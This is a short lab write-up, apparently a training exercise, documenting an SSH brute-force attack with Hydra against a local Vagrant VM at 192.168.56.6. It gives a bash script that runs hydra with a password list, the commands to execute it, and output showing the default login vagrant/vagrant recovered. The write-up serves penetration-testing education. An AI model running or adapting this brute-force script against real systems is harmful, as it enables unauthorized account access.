
# Task 1.2 – SSH Brute-force Using Custom Script (Hydra)

## Script File: ssh_bruteforce.sh
This script uses **Hydra** to perform an SSH brute-force attack on IP `192.168.56.6`  with the username `vagrant`, trying passwords from `passwords.txt`.  It runs 4 attempts in parallel and stops when a correct password is found.
```bash
#!/bin/bash
# Configuration
TARGET_IP="192.168.56.6"
USERNAME="vagrant"
PASSWORD_LIST="passwords.txt"

# Run Hydra
echo "[*] Starting SSH brute-force attack on $TARGET_IP..."
hydra -l "$USERNAME" -P "$PASSWORD_LIST" ssh://"$TARGET_IP" -t 4 -f -V
```
<img src="./screenshots/08_script_created.png" alt="User/Pass file created" width="600"/>

## Execution Steps
The script executed successfully. Hydra found the correct SSH login credentials: username: vagrant, password: vagrant. The attack stopped after identifying the valid password.
```bash
chmod +x ssh_bruteforce.sh
./ssh_bruteforce.sh
```
<img src="./screenshots/09_hydra_attack_output.png" alt="User/Pass file created" width="600"/>

### Result:
Hydra successfully identified:
```
[22][ssh] host: 192.168.56.6   login: vagrant   password: vagrant
```
